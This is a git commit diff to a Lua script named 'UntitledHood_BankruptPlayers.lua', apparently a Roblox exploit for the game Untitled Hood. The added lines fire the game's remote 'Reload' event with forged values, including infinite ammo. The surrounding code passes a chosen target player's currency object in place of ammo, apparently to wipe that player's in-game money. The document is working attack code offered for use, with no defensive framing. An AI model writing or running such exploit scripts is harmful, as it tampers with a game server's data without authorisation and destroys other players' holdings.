17a11ce7ed576e6d5318f518a9b6db083787fc3c
Kitzoon <68196838+Kitzoon@users.noreply.github.com>
2022-04-11 22:47:41 -0600

    Update UntitledHood_BankruptPlayers.lua

--- UntitledHood_BankruptPlayers.lua
+++ UntitledHood_BankruptPlayers.lua
@@ -5,6 +5,17 @@ local target = "target name here"
 game.ReplicatedStorage:FindFirstChild(".gg/untitledhood"):FireServer(
    "Reload",
    {
+       Name = "[Revolver]",
+       Ammo = {Value = math.huge*9e9},
+       MaxAmmo = {Value = 0}
+   }
+)
+
+task.wait(2)
+
+game.ReplicatedStorage:FindFirstChild(".gg/untitledhood"):FireServer(
+   "Reload",
+   {
         Name = "[Revolver]",
         Ammo = game:GetService("Players")[target].DataFolder.Currency,
         MaxAmmo = {Value = -69}
